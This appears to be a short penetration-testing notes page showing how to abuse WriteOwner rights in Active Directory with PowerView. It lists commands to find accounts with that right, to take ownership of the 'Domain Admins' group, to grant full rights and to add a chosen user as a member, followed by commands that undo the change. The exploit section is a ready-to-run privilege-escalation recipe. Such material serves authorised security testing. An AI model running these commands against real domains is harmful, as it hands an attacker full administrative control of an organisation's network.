# Scripts

## PowerView

### 01 - Enumerate

Import the module.

```
PS C:\> Import-Module .\PowerView.ps1
```

Enumerate the current target.

```powershell
PS C:\> $targetusername = '<target_username>'
Invoke-ACLScanner -ResolveGUIDs | Where-Object {$_.IdentityReferenceName -Like $targetusername}
```

TODO: Do a for loop to enumerate all targets to list accounts that have `WriteOwner` permissions.

### 02 - Exploit

Add the user account in `Domain Admins`.

```powershell
PS C:\> $adgroup = 'Domain Admins'
Set-DomainObjectOwner -Identity $adgroup -OwnerIdentity $targetusername
Add-DomainObjectAcl -TargetIdentity $adgroup -PrincipalIdentity $targetusername -Rights All
Add-DomainGroupMember -Identity $adgroup -Members $targetusername
```

Confirm the target username is added in the group.

```powershell
PS C:\> Get-LocalGroupMember $adgroup | Format-Table Name, PrincipalSource
```

### 03 - Cleanup

#### 3.1 - Command Prompt

```
C:\> net.exe group "Domain Admins" "<target_username>" /delete /domain
```

#### 3.2 - PowerShell

```
PS C:\> Remove-ADGroupMember -Identity "Domain Admins" -Members "<target_username>" -Confirm
```